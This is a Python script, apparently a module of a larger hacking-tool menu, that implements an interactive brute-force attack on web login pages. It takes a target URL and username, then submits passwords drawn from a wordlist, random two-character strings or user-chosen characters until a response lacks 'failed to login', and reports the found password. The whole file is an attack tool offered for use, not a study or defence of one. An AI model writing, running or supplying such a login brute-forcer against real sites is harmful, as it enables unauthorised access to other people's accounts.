
# -----------Brute Force imports-------
import requests
import random



class Wipe(object):
    def __repr__(self):
        return '\n' * 10000
wipe = Wipe()




def QUESTIONBRUTEFORCE():
    # custombruteforce = Figlet(font='bubble')
    #
    # print(custombruteforce.renderText('''"Welcome To Elvo\n
    #                                   Brute-Forcer'''))
    print('Welcome To The Brute-Forcer')

    BruteIntro = print('''How would you like to Brute Force?

1.With a Worldlist >         [1]
2.With Random Numbers >      [2]
3.With Your Own Characters > [3]
4.Main Menu >                [4]
''')
    BruteChoice = input(str("And your choice would be?\n...: "))
    print("You chose...: ", BruteChoice)

    if BruteChoice == "1":

        url = input('Place the URL: ')
        username = input('Place the username: ')

        # chars =  "123"

        def send_request(username, passwd):
            data = {
                "username": username,
                "password": passwd
            }

            r = requests.get(url, data=data)
            return r

        def implist():
            print('ADD .txt TO THE FILE!')
            worldlist = input('Wordlist Path...: ')
            try:
                file = open(worldlist, 'r')
                tries = file.read().split('\n')
                file.close()
                return tries
            except FileNotFoundError:
                return print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
            return QUESTIONBRUTEFORCE()

        def main(tries):
            for passwd in tries:
                r = send_request(username, passwd)

                if 'failed to login' in r.text.lower():
                    print(f"Incorrect {passwd}\n")
                else:
                    print(f"Correct Password | {passwd} | !\n")
                    break

        tries = implist()
        main(tries)

    elif BruteChoice == "2":

        url = input('Place the URL: ')
        username = input('Place the username: ')
        chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        try:

            def send_request(username, passwd):
                data = {
                    "username": username,
                    "password": passwd
                }

                r = requests.get(url, data=data)
                return r

            def main():
                while True:
                    rndpasswd = random.choices(chars, k=2)
                    # k= is the password length.
                    passwd = "".join(rndpasswd)
                    # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                    r = send_request(username, passwd)

                    if 'failed to login' in r.text.lower():
                        print(f"Incorrect {passwd}\n")
                    else:
                        print(f"Correct Password | {passwd} | !\n")
                        break

            main()
        except requests.exceptions.MissingSchema:
            return print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
        return QUESTIONBRUTEFORCE()

    elif BruteChoice == "3":

        url = input('Place the URL: ')
        username = input('Place the username: ')
        chars = input('Write the characters to use')
        try:

            def send_request(username, passwd):
                data = {
                    "username": username,
                    "password": passwd
                }

                r = requests.get(url, data=data)
                return r

            def main():
                while True:
                    rndpasswd = random.choices(chars, k=2)
                    # k= is the password length.
                    passwd = "".join(rndpasswd)
                    # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                    r = send_request(username, passwd)

                    if 'failed to login' in r.text.lower():
                        print(f"Incorrect {passwd}\n")
                    else:
                        print(f"Correct Password | {passwd} | !\n")
                        break

            main()
        except requests.exceptions.MissingSchema:
            return print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
        return QUESTIONBRUTEFORCE()

    elif BruteChoice == '4':
        from Allinone import ALLINONEMAIN
        print('\n>>>Back To the Main Menu>>>\n')
        return ALLINONEMAIN()

    else:
        print('''
                    \n
-----ERROR-----
Something Isn't right
-----ERROR-----
                    \n''')
        return QUESTIONBRUTEFORCE()

QUESTIONBRUTEFORCE()
# -----------------------Brute Force-----------------------



